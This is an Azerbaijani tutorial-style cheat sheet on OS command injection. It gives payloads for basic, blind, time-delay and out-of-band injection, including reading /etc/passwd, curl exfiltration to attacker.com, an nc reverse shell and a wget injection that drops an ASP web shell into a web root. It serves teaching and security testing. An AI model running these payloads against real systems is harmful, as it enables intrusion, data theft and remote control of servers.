# OS Command Injection

## 1. OS Command Injection Nədir?
OS Command Injection, istifadəçinin daxil etdiyi məlumatın əməliyyat sistemi əmr sətrində icra olunmasına imkan verir. Bu hücumdan istifadə edərək hücumçular sistemə ziyan vura, məxfi məlumatları oğurlaya və hətta sistem üzərində tam nəzarət əldə edə bilərlər.

## 2. OS Command Injection Nümunələri

### 2.1. Basic OS Command Injection
Bu metodla istifadəçi girişinə daxil edilən əmr, əsas əmrdən sonra icra olunur.
```sh
ping -c 4 127.0.0.1; cat /etc/passwd
```
Yuxarıdakı əmrdə `ping` icra olunur, sonra isə `/etc/passwd` faylı oxunur.

### 2.2. Blind OS Command Injection
Əgər tətbiq nəticəni birbaşa göstərmirsə, ancaq əmrlərin icra olunduğunu yoxlamaq istəyiriksə:
```sh
127.0.0.1 && sleep 10
```
Əgər server cavab vermək üçün 10 saniyə gözləyirsə, bu, tətbiqin əmrləri icra etdiyini göstərir.

### 2.3. Out-of-band OS Command Injection
Məlumatları birbaşa əldə edə bilmiriksə, serverin çıxış məlumatlarını öz serverimizə göndərməyə cəhd edə bilərik:
```sh
curl http://attacker.com/?data=$(whoami)
```
Bu əmrlə `whoami` nəticəsi hücumçunun serverinə göndərilir.

## 3. OS Command Injection Gecikmə Testləri
Tətbiqin əmrləri icra edib-etmədiyini yoxlamaq üçün aşağıdakı testlərdən istifadə etmək olar:
```sh
|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
| ping -i 30 127.0.0.1 |
| ping -n 30 127.0.0.1 |
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
; ping 127.0.0.1 ;
%0a ping -i 30 127.0.0.1 %0a
` ping 127.0.0.1 `
```
Əgər serverin cavabı gecikirsə, deməli, tətbiq OS command injection-a həssasdır.

## 4. OS Command Injection nəticələrinin əldə edilməsi
Əgər əmrlərin icrası təsdiqlənərsə, aşağıdakı üsullarla nəticələri əldə etmək olar:

### 4.1. Birbaşa Nəticələri Görmək
```sh
ls
whoami
```

### 4.2. Çıxış məlumatlarını veb serverə yazmaq
```sh
dir > c:\inetpub\wwwroot\output.txt
```

### 4.3. Out-of-band əlaqə yaratmaq
```sh
nc -e /bin/sh attacker.com 4444
```

### 4.4. Wget vasitəsilə fayl yazmaq
```sh
url=http://wahh-attacker.com/%20-O%20c:\inetpub\wwwroot\scripts\cmdasp.asp
```


